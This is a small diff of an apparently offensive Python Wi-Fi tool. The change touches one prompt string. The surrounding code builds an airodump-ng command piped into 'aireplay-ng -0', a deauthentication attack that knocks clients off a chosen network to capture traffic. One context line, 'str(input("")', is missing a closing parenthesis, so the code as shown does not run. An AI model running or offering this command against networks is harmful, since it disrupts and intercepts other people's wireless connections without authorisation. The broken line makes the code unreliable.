@@ -73,7 +73,7 @@ def intro():
         channel   = int(input())
         print("Enter the path of the output file ?")
         path = str(input("")
-        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
+        print("Enter the number of the packets [1-10000] ( 0 for unlimited number)")
         print("the number of the packets Depends on the Distance Between you and the network")
         dist = int(input(""))
         order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
